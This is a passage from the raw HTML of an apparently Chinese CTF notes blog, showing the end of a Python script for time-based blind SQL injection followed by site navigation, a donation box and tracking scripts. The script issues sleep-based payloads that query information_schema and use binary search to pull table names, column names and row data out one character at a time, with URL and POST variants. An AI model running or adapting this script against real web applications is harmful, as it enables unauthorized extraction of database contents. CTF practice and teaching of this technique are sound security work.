class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select/**/group_concat(xxx)from(yyy.zzz)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.6),0)%23&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># data = &#123;</span></span><br><span class="line">        	<span class="comment">#    &#x27;uname&#x27;:f&quot;admin&#x27;)and &#123;payload&#125;#&quot;,</span></span><br><span class="line">        	<span class="comment">#    &#x27;passwd&#x27;: &#x27;1&#x27;</span></span><br><span class="line">        	<span class="comment"># &#125;</span></span><br><span class="line">            r = requests.get(url + payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="comment"># r = requests.post(url, data=data, timeout=0.5)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ul></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/05/16/web-fuzz%E6%94%B6%E9%9B%86/" title="fuzz收集"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>